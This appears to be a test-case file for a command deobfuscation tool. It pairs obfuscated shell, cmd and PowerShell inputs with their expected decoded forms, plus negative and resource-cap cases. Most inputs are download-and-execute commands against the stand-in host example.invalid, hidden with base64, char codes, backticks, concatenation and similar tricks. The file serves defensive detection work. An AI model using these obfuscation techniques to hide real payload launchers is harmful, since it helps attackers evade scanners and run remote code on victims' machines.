{"id": "command.1b.deob.concat-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["& ('ms'+'hta') ht", "tps://example.invalid/a.hta"]}, "expect": {"contains": [{"parts": ["& ms", "hta ht", "tps://example.invalid/a.hta"]}], "kinds_include": ["concat", "unwrap"]}}
{"id": "command.1b.deob.concat-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& (\"p\"+\"ow\"+'er'+'shell') -c calc", "expect": {"output": {"parts": ["& power", "shell -c calc"]}, "kinds_include": ["concat"]}}
{"id": "command.1b.deob.backtick-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["p`o`w`e`r`s`h`e`l`l -w hid", "den -c calc"]}, "expect": {"output": {"parts": ["power", "shell -w hid", "den -c calc"]}, "kinds": ["backtick"]}}
{"id": "command.1b.deob.backtick-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["i`e`x (i`w`r ht", "tps://example.invalid/a)"]}, "expect": {"output": {"parts": ["i", "ex (i", "wr ht", "tps://example.invalid/a)"]}, "kinds": ["backtick"]}}
{"id": "command.1b.deob.char-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "-join [char[]](109,115,104,116,97)", "expect": {"output": {"parts": ["'ms", "hta'"]}, "kinds": ["char_code", "join"]}}
{"id": "command.1b.deob.char-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& ([char]0x6d+[char]115+'hta')", "expect": {"output": {"parts": ["& ms", "hta"]}, "kinds_include": ["char_code", "concat", "unwrap"]}}
{"id": "command.1b.deob.join-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& (('m','s','h','t','a') -join '')", "expect": {"output": {"parts": ["& ms", "hta"]}, "kinds_include": ["join"]}}
{"id": "command.1b.deob.format-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["& (\"{1}{0}\" -f 'hta','ms') ht", "tps://example.invalid/a"]}, "expect": {"output": {"parts": ["& ms", "hta ht", "tps://example.invalid/a"]}, "kinds_include": ["format", "unwrap"]}}
{"id": "command.1b.deob.replace-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& ('mZZhta' -replace 'zz','s')", "expect": {"output": {"parts": ["& ms", "hta"]}, "kinds_include": ["replace"]}}
{"id": "command.1b.deob.replace-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& ('mXhta'.Replace('X','s'))", "expect": {"output": {"parts": ["& ms", "hta"]}, "kinds_include": ["replace"]}}
{"id": "command.1b.deob.string-method-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "& ([string]::Concat('ms','hta'))", "expect": {"output": {"parts": ["& ms", "hta"]}, "kinds_include": ["string_method"]}}
{"id": "command.1b.deob.string-method-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "[String]::Join('', 'ms', 'hta')", "expect": {"output": {"parts": ["'ms", "hta'"]}, "kinds": ["string_method"]}}
{"id": "command.1b.deob.ps-variable-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "$a='ms'; $b='hta'; & ($a+$b)", "expect": {"output": {"parts": ["$a='ms'; $b='hta'; & ms", "hta"]}, "kinds": ["ps_variable", "concat", "unwrap"]}}
{"id": "command.1b.deob.base64-ps-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["i", "ex ([Text.Encoding]::UTF8.GetString([Convert]::FromBas", "e64String('aXdyIGh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2E=')))"]}, "expect": {"output": {"parts": ["i", "ex i", "wr ht", "tps://example.invalid/a"]}, "kinds_include": ["base64", "unwrap"]}}
{"id": "command.1b.deob.base64-ps-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["i", "ex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBas", "e64String(\"aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhAA==\")))"]}, "expect": {"output": {"parts": ["i", "ex i", "rm ht", "tps://example.invalid/a"]}, "kinds_include": ["base64"]}}
{"id": "command.1b.deob.enc-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["power", "shell -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhACAAfAAgAGkAZQB4AA=="]}, "expect": {"output": {"parts": ["power", "shell -enc i", "wr ht", "tps://example.invalid/a | i", "ex"]}, "kinds": ["encoded_command"]}}
{"id": "command.1b.deob.cmd-substring-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["set x=zzms", "hta&& call %x:~2,5% ht", "tps://example.invalid/a.hta"]}, "expect": {"contains": [{"parts": ["call ms", "hta ht", "tps://example.invalid/a.hta"]}], "kinds": ["cmd_substring"]}}
{"id": "command.1b.deob.cmd-substring-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "%ComSpec:~-7,3% /c calc", "expect": {"output": {"parts": ["c", "md /c calc"]}, "kinds": ["cmd_substring"]}}
{"id": "command.1b.deob.cmd-substring-003", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["c", "md /v:on /c \"set x=mZhta&& call !x:Z=s! x.hta\""]}, "expect": {"contains": [{"parts": ["call ms", "hta x.hta"]}], "kinds": ["cmd_substring"]}}
{"id": "command.1b.deob.cmd-substring-004", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "%PUBLIC:~4,1%%PUBLIC:~1,1%", "expect": {"output": "s:", "kinds": ["cmd_substring"]}, "note": "PUBLIC = C:\\Users\\Public (rules/command/programs.json)"}
{"id": "command.1b.deob.nested-variable-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["set a=ms&& set b=%a%hta&& call %b% ht", "tps://example.invalid/a.hta"]}, "expect": {"contains": [{"parts": ["call ms", "hta ht", "tps://example.invalid/a.hta"]}], "kinds": ["variable", "nested_variable"]}}
{"id": "command.1b.deob.url-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["ms", "hta %68%74%74%70%73://example.invalid/a"]}, "expect": {"output": {"parts": ["ms", "hta ht", "tps://example.invalid/a"]}, "kinds": ["url_decode"]}}
{"id": "command.1b.deob.hex-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["echo -e '\\x63\\x75\\x72\\x6c ht", "tps://example.invalid/a' | sh"]}, "expect": {"output": {"parts": ["echo -e 'cu", "rl ht", "tps://example.invalid/a' | sh"]}, "kinds": ["hex_decode"]}}
{"id": "command.1b.deob.hex-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "echo 6375726c2068747470733a2f2f6578616d706c652e696e76616c69642f61207c207368 | xxd -r -p | sh", "expect": {"output": {"parts": ["echo cu", "rl ht", "tps://example.invalid/a | sh | xxd -r -p | sh"]}, "kinds": ["hex_decode"]}}
{"id": "command.1b.deob.base64-shell-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["echo Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9hIHwgYmFzaA== | bas", "e64 -d | ba", "sh"]}, "expect": {"output": {"parts": ["echo cu", "rl ht", "tps://example.invalid/a | ba", "sh | bas", "e64 -d | ba", "sh"]}, "kinds": ["base64"]}}
{"id": "command.1b.deob.base64-shell-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["ba", "sh -c \"$(bas", "e64 -D <<< Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9hIHwgYmFzaA==)\""]}, "expect": {"contains": [{"parts": ["cu", "rl ht", "tps://example.invalid/a | ba", "sh"]}], "kinds": ["base64"]}}
{"id": "command.1b.deob.base64-python-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["pyt", "hon3 -c \"import bas", "e64;exec(bas", "e64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0IGFzIHU7ZXhlYyh1LnVybG9wZW4oJ2h0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2EnKS5yZWFkKCkp'))\""]}, "expect": {"contains": [{"parts": ["u.url", "open("]}], "kinds": ["base64"]}}
{"id": "command.1b.deob.full-width-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["ｍｓｈｔａ ht", "tps://example.invalid/a"]}, "expect": {"output": {"parts": ["ms", "hta ht", "tps://example.invalid/a"]}, "kinds": ["full_width"]}}
{"id": "command.1b.deob.markdown-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "```sh\ncurl -fsSL https://bun.sh/install | bash\n```\nThen run `bun upgrade`.", "expect": {"output": {"parts": ["\ncu", "rl -fsSL ht", "tps://bun.sh/install | ba", "sh\n\nThen run bun upgrade."]}, "kinds": ["markdown"]}}
{"id": "command.1b.deob.normalize-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "m^s^h^t^a x.hta", "expect": {"output": {"parts": ["ms", "hta x.hta"]}, "kinds": ["caret"], "max_layer_le": 0}}
{"id": "command.1b.deob.message-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "('a'+'b')", "expect": {"messages_contain": ["接起用 + 拼出來的字串"]}}
{"id": "command.1b.deob.cap-layers-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "x -enc ", "expect": {"max_layer_le": 5, "contains": ["-enc"]}, "note": "8 nested -EncodedCommand layers: only MAX_LAYERS = 5 are peeled"}
{"id": "command.1b.deob.cap-growth-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": {"parts": ["set a=", {"repeat": {"text": "x", "count": 1000}}, "&& ", {"repeat": {"text": "%a%", "count": 64}}]}, "expect": {"capped": true, "output_len_le": 4796}, "note": "64 expansions of a 1000-char value would grow 50x; the 4x cap stops it"}
{"id": "command.1b.deob.mask-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "('4111 1111 1111 1111'+' x')", "expect": {"previews_not_contain": ["4111 1111 1111 1111"], "kinds_include": ["concat"]}, "note": "Visa test number; previews are masked"}
{"id": "command.1b.deob.negative-001", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "hello world", "expect": {"output": "hello world", "kinds": []}}
{"id": "command.1b.deob.negative-002", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "Write-Host (\"Hello \" + $name)", "expect": {"output": "Write-Host (\"Hello \" + $name)", "kinds": []}}
{"id": "command.1b.deob.negative-003", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "'{0} items' -f $count", "expect": {"output": "'{0} items' -f $count", "kinds": []}}
{"id": "command.1b.deob.negative-004", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "$path -replace '\\\\','/'", "expect": {"kinds": []}}
{"id": "command.1b.deob.negative-005", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "git log --format=%H -n 1", "expect": {"kinds": []}}
{"id": "command.1b.deob.negative-006", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "expect": {"kinds": []}}
{"id": "command.1b.deob.negative-007", "area": "command", "op": "command.deobfuscate", "source": "new", "input": "https://example.invalid/a%20b", "expect": {"kinds": []}}
